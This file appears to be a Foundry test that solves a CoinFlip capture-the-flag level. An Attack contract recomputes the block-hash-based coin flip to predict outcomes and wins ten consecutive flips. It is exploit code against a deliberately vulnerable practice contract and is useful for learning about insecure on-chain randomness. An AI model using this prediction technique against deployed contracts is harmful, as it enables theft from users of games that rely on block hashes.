// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/03_CoinFlip.sol";

contract CoinFlipTest is Test {
    CoinFlip instance;
    Attack attacker;
    address player;

    function setUp() public {
        instance = new CoinFlip();
        //player = vm.addr(1);
        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        attacker.attack();
        vm.assertEq(instance.consecutiveWins(), 10);
    }
}

contract Attack is Test {
    CoinFlip instance;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address fb) payable {
        instance = CoinFlip(fb);
    }

    function attack() public {
        uint8 num = 1;
        while (instance.consecutiveWins() < 10) {
            vm.roll(num);

            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;
            instance.flip(coinFlip == 1 ? true : false);

            num += 1;
        }
    }
}
